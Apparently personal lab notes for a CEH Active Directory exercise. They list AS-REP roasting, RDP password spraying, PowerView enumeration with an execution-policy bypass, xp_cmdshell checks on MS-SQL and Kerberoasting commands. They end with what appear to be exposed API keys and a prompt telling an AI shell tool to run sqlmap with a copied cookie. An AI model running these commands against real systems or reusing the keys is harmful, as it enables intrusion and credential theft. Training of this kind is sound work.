##no-auth in Kerberos
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
##password spraying
cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"


##PowerView
Powershell 
Powershell -EP Bypass
Import-Module .\Powerview.ps1

##userful commands
Get-NPComputer
Get-NetGroup
Get-NetUser
Get-NetOU - Lists all organizational units (OUs) in the domain.
Get-NetSession - Lists active sessions on the domain.
Get-NetLoggedon - Lists users currently logged on to machines.
Get-NetProcess - Lists processes running on domain machines.
Get-NetService - Lists services on domain machines.
Get-NetDomainTrust - Lists domain trust relationships.
Get-ObjectACL - Retrieves ACLs for a specified object.
Find-InterestingDomainAcl - Finds interesting ACLs in the domain.
Get-NetSPN - Lists service principal names (SPNs) in the domain.
Invoke-ShareFinder - Finds shared folders in the domain.
Invoke-UserHunter - Finds where domain admins are logged in.
Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines.

### we find that SQL_srv has higher privileges

### Performing Attack on MS-SQL service ( port 1433)
xp_cmdshell is a SQL server stored procedure enabling command shell execution


###mssqlclient.py syntax
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:<password>@10.10.1.30 -port 1433

SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';, returning a value of 1, indicating that xp_cmdshell is enabled on the server.

##rubeus.exe
Rubeus.exe kerberoas /outfile:hash.txt



## ai activation key and wpscan api-token

AI 22c83d6b6e5a4863b6998a625906c671
WPSCAn API token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads
bash sgt.sh
type the activation key
sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the DBMS databases" 


